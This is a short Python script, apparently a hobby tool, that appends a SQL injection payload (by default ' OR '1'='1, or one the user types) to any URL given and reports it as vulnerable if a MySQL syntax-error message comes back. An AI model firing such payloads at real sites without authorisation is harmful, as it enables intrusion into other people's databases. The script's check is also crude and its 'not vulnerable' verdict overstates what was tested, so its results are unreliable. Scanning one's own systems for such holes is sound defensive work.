#!/usr/bin/env python3
#v1.5 
#added prompt to add custom sql script payload or use default payload

import urllib.request
import urllib.parse

# Function to check for SQL injection vulnerability
def SQL_TEST(url, payload):
    # payload added to the URL
    parsed_payload = urllib.parse.quote(payload)
    url_with_payload = f"{url}?id={parsed_payload}"

    try:
        response = urllib.request.urlopen(url_with_payload)
        response_text = response.read().decode('utf-8')

        # Check SQL injection - true or false
        if "error in your SQL syntax" in response_text:
            return True  # SQL injection detected
        else:
            return False  # No SQL injection detected

    except urllib.error.HTTPError as e:
        return False  

if __name__ == "__main__":
    target_url = input("Enter the URL to test for SQL injection vulnerability: ")
    use_default_payload = input("Do you want to use the default payload? (y/n): ")

    if use_default_payload.lower() == 'y':
        payload = "' OR '1'='1"  # Default payload 
    else:
        payload = input("Enter a custom payload: ") #custom payload

    if SQL_TEST(target_url, payload):
        print(f"{target_url} may be vulnerable to SQL injection.")
    else:
        print(f"{target_url} is not vulnerable to SQL injection.")